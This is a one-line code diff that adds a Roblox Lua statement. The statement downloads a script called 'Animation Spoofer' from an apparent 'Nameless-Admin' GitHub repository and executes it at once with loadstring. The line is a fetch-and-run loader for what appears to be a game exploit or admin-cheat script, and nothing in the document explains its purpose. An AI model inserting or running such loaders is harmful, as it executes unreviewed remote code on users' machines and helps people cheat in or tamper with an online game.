@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/ltseverydayyou/Nameless-Admin/blob/main/Animation%20Spoofer?raw=true"))()
